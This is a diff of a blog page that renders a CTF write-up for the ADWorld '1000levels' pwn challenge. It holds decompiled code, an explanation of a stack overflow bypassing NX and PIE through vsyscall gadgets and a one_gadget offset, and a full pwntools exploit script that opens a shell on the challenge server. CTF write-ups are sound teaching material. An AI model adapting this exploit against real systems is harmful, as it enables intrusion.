@@ -161,225 +161,194 @@
             <div class="main-content">
 
                 
-                    $avatarWidth = 46px;
-$arrow-icon-width = 16px;
-$post-nav-max-width = 220px;
-$article-title-font-size = 1.6rem;
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
 
-.article-content-container {
+        <div class="article-title">
+            <span class="title-hover-animation">ADWorld PWN Challenge Area Write-ups (Advanced ROP)</span>
+        </div>
 
-  keep-container(false, 0, 0, 30px, 30px);
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/img/aliwangwang.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">TyeYeah</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-10-09 14:52:57</span>
+        <span class="mobile">2020-10-09 14:52</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/linux/">linux</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/stack-overflow/">stack-overflow</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ctf/">ctf</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/rop/">rop</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
-  .article-title {
-    color: var(--second-text-color);
-    font-weight: 600;
-    font-size: $article-title-font-size;
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.4k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>8 Mins</span>
+        </span>
+    
+    
+</div>
 
-    +keep-tablet() {
-      font-size: $article-title-font-size * 0.9;
-    }
+                    </div>
+                </div>
+            </div>
+        
 
-    +keep-mobile() {
-      font-size: $article-title-font-size * 0.8;
-    }
-  }
+        <div class="article-content markdown-body">
+            <p>This part is for special <code>ROP</code> tasks.</p>
+<h2 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h2><p>Attachment: <a href="/filehost/apcaw/1000levevls.gz">1000levevls.gz</a><br>Description: None</p>
+<p>It is related to <code>vsyscall</code> which exists in some old version <code>glibc</code>.</p>
+<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Unzip:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tar xvf 1000levevls.gz</span><br><span class="line">100levels</span><br><span class="line">libc.so</span><br></pre></td></tr></table></figure>
+<p>Check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ file 100levels</span><br><span class="line">100levels: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8293d0a04bff99850d490343e65e25d81b6b1966, stripped</span><br><span class="line">$ checksec 100levels</span><br><span class="line">[*] &#x27;/root/100levels&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">$ ./libc.so</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu7) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">        crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">        GNU Libidn by Simon Josefsson</span><br><span class="line">        Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">        BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
+<p>Pseudocode:<br><code>main</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">initial</span>();</span><br><span class="line">  <span class="built_in">banner</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">menu</span>();</span><br><span class="line">      v3 = <span class="built_in">read_num</span>();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">go</span>(a1, (__int64)a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      a1 = (__int64)<span class="string">&quot;Wrong input&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong input&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_D92</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>hint</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hint</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-100h]</span></span><br><span class="line">  __int16 v3; <span class="comment">// [rsp+14h] [rbp-FCh]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( unk_20208C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v1, <span class="string">&quot;Hint: %p\n&quot;</span>, &amp;system, &amp;system);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&#x27;N NWP ON&#x27;</span>;</span><br><span class="line">    v2 = <span class="string">&#x27;UF O&#x27;</span>;</span><br><span class="line">    v3 = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>go</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">go</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST0C_4</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v8; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-108h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+20h] [rbp-100h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many levels?&quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">read_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )</span><br><span class="line">    v7 = v4;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">  v5 = <span class="built_in">read_num</span>();</span><br><span class="line">  v8 = v7 + v5;</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">99</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You are being a real man.&quot;</span>);</span><br><span class="line">      v9 = <span class="number">100LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s go!&#x27;&quot;</span>);</span><br><span class="line">    v6 = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">level</span>(v9) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v10, <span class="string">&quot;Great job! You finished %d levels in %d seconds\n&quot;</span>, v9, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v3 - v6), v5);</span><br><span class="line">      <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v10);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Coward Coward Coward Coward Coward&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>and <code>level</code> in <code>go</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">level</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">level</span>(a1 - <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="built_in">rand</span>() % a1;</span><br><span class="line">  v2 = <span class="built_in">rand</span>();</span><br><span class="line">  v9 = v2 % a1;</span><br><span class="line">  v8 = v2 % a1 * v10;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;====================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Level %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)a1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Question: %d * %d = ? Answer:&quot;</span>, v10, v9);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">strtol</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> v3 == v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>From <code>read(0, &amp;buf, 0x400uLL);</code> in <code>level()</code> we can see it will overflow <code>__int64 buf; // [rsp+10h] [rbp-30h]</code>. However with <code>NX</code> and <code>PIE</code> enabled, <code>ROP</code> chains are hard to deal.</p>
+<p>There is a <code>hint()</code> which could leak <code>system</code> for us, but <code>unk_20208C</code> cannot be changed by us now, so is this func useless?</p>
+<p>No, now let’s see the assembly code:</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000000000000D11                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:system_ptr</span><br><span class="line"><span class="symbol">.text:</span>0000000000000D18                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_110], <span class="built_in">rax</span></span><br></pre></td></tr></table></figure>
+<p>Though it won’t be printed, the address of <code>system</code> is saved in <code>rbp+var_110</code> (<code>rbp-0x110</code> which is on the stack), and between the running of <code>hint()</code> and <code>go()</code>, the value of <code>rbp</code> remains the same, so the “leaked” <code>system</code> can be also found in <code>rbp-0x110</code> in func frame of <code>go()</code> (corresponding variable is <code>__int64 v7; // [rsp+10h] [rbp-110h]</code>).</p>
+<p>To keep <code>v7</code> unchanged, we have to first input a value less than or equal to 0, then we input <code>v5</code> and the number of <code>level</code> will be determined by <code>v8 = v7 + v5;</code>.</p>
+<p>We can surely use brute-force attack to identify the value of <code>v7</code>(<code>system</code> address). When <code>v5</code> is smaller than <code>-system_address</code>, we will receive <code>Coward Coward Coward Coward Coward</code>, while when <code>v5</code> is larger than <code>-system_address</code> we will enter the <code>level()</code>. You may notice that we always end up entering <code>level()</code>, so why not use stack overflow directly?</p>
+<p>The <code>level()</code> is called recursively, so only in the last <code>level()</code> can we use the shortest payload to reach <code>v7</code> in func frame of <code>go()</code>.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 v4; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">__int64 v5; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line"><span class="keyword">int</span> v6; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">__int64 v7; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br></pre></td></tr></table></figure>
+<p>However still <code>0x10</code> needs to be overflowed. Now we think about how to exploit it, because we haven’t leaked any address but we need <code>ROP</code> gadget to fill the gap; besides the <code>system</code> address in <code>v7</code> needs an argument <code>/bin/sh</code> to be effective.</p>
+<p>First we deal with the <code>ROP</code> gadgets issue.<br>We use <code>vsyscall</code>(virtual system call) because it has fixed address even with <code>ASLR</code> on and <code>PIE</code> enabled. It is the first and oldest mechanism in the Linux kernel that is designed to accelerate execution of certain system calls. The principle of work of the vsyscall concept is: The Linux kernel maps into user space a page that contains some variables and the implementation of some system calls.<br><img src="/imghost/apcaw/vsyscall.png" alt="vsyscall.png"><br>It is dumped from <code>gdb</code> and viewed in<code>IDA</code>. There are three <code>syscalls</code>: <code>gettimeofday</code>, <code>time</code> and <code>getcpu</code> (starts at <code>0xffffffffff600000</code>, <code>0xffffffffff600400</code> and <code>0xffffffffff600800</code>).<br>We can use these 3 functions as gadgets.</p>
+<p>Next we have to think about how to use <code>system</code> in <code>v7</code>. Since we cannot get exact address of <code>pop rdi; ret</code>, it’s better to use <code>one gadget</code> because the offset between <code>system</code> and <code>one gadget</code> is fixed, so setting an appropriate <code>v5</code> can change <code>v7</code> to be address of <code>one gadget</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget  libc.so</span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xef6c4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf0567 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
+<p>We choose <code>0x4526a</code> because <code>gettimeofday</code>, <code>time</code> and <code>getcpu</code> can keep [rsp+0x30] &#x3D;&#x3D; NULL (<code>0xef6c4</code> and <code>0xf0567</code> are hard to satisfy).<br>Then let us see exploit.</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>We have to write <code>answer()</code> to answer questions automatically because only the last round of <code>level()</code> will be our best chance to send payload. It means we will wait for a long time every time we run this script.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;100levels&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="string">&#x27;45100&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;100levels&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">vsyscall_gettimeofday = <span class="number">0xffffffffff600000</span></span><br><span class="line">vsyscall_time = <span class="number">0xffffffffff600400</span></span><br><span class="line">vsyscall_getcpu = <span class="number">0xffffffffff600800</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">answer</span>():</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Question: &#x27;</span>) </span><br><span class="line">        answer = <span class="built_in">eval</span>(sh.recvuntil(<span class="string">&#x27;=&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Answer:&#x27;</span>)</span><br><span class="line">        sh.sendline(<span class="built_in">str</span>(answer))</span><br><span class="line"></span><br><span class="line">sh.recv() <span class="comment"># menu</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>) <span class="comment"># hint</span></span><br><span class="line">sh.recv() <span class="comment"># menu</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.recv() <span class="comment"># How many levels?</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;0&#x27;</span>) <span class="comment"># &#x27;&lt;=0&#x27; to not overwrite system_addr </span></span><br><span class="line">sh.recv() <span class="comment"># Coward\nAny more?\n</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;-294&#x27;</span>) <span class="comment"># 0x4526a from one_gadget</span></span><br><span class="line"><span class="comment"># sh.sendline(&#x27;697140&#x27;) # 0xef6c4</span></span><br><span class="line"><span class="comment"># sh.sendline(&#x27;700887&#x27;) # 0xf0567</span></span><br><span class="line">sh.recv() <span class="comment"># You are being a real man.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">        log.info(i)</span><br><span class="line">        answer()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(vsyscall_gettimeofday) *<span class="number">3</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.recv()</span></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        </div>
 
+        
 
-  .article-header {
-    position: relative;
-    padding-left: $avatarWidth;
-    width: 100%;
-    height: $avatarWidth;
-    box-sizing: border-box;
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/pwn/">#pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/linux/">#linux</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/stack-overflow/">#stack-overflow</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/rop/">#rop</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
 
-    .avatar {
-      position: absolute;
-      top: 0
-      left: 0;
-      width: $avatarWidth;
-      height: $avatarWidth;
-      padding: 1px;
-      box-sizing: border-box;
-      border: 1px solid var(--border-color);
-      border-radius: 50%;
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/10/15/2020-10-15-Stack-Overflow-Intro/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Stack Overflow Intro</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/10/05/2020-10-05-ADWorld-PWN-Challenge-Area-Write-ups-Misc/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">ADWorld PWN Challenge Area Write-ups (Misc)</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
 
-      img {
-        border-radius: 50%;
-        width: 100%;
-        height: 100%;
-        background: var(--avatar-background-color);
-      }
-
-    }
-
-
-    .info {
-      padding: 2px 0;
-      margin-left: 10px;
-      box-sizing: border-box;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      width: 100%;
-      height: 100%;
-
-      .author {
-        font-weight: 600;
-        font-size: 1.18rem;
-        display: flex;
-        align-items: center;
-
-        .name {
-          color: var(--default-text-color);
-        }
-
-        .author-label {
-          margin-left: 10px;
-          font-size: 0.8rem;
-          font-weight: 500;
-          padding: 0 5px;
-          border-radius: 5px;
-          color: #fff;
-          background: var(--selection-color);
-        }
-
-      }
-    }
-
-  }
-
-
-  .article-header, .article-header-meta-info {
-    margin-top: 16px;
